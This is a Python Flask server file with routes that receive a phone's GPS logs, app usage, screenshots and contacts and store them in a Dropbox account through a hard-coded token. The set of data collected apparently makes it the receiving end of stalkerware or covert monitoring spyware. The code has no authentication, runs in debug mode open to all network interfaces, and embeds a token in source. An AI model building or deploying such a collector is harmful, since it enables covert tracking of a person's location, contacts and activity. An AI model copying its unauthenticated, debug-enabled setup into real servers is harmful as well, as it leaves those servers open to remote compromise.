from flask import Flask, request, jsonify
from datetime import datetime
import dropbox
import os
import json

# 🔐 Paste your token here (or load from .env)
DROPBOX_ACCESS_TOKEN = "sl.your_token_here"

app = Flask(__name__)
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)


def upload_json_to_dropbox(filename, data):
    dropbox_path = f"/{filename}"
    content = (json.dumps(data) + "\n").encode("utf-8")
    dbx.files_upload(content, dropbox_path, mode=dropbox.files.WriteMode.append)


def upload_file_to_dropbox(filename, file_data):
    dropbox_path = f"/{filename}"
    dbx.files_upload(file_data.read(), dropbox_path, mode=dropbox.files.WriteMode.overwrite)


# 🛰️ Route: GPS Logs
@app.route('/upload/gps', methods=['POST'])
def upload_gps():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    upload_json_to_dropbox('gps_logs.json', data)
    return jsonify({"status": "success"})


# 📊 Route: App Usage
@app.route('/upload/app-usage', methods=['POST'])
def upload_app_usage():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    upload_json_to_dropbox('app_usage.json', data)
    return jsonify({"status": "success"})


# 📷 Route: Screenshot Upload
@app.route('/upload/screenshot', methods=['POST'])
def upload_screenshot():
    file = request.files.get('screenshot')
    if file:
        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        upload_file_to_dropbox(filename, file)
        return jsonify({"status": "success", "filename": filename})
    return jsonify({"status": "error", "message": "No file uploaded"})


# 📇 Route: Contacts Upload
@app.route('/upload/contacts', methods=['POST'])
def upload_contacts():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    upload_json_to_dropbox('contacts.json', data)
    return jsonify({"status": "success"})

# 🟢 Start Server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
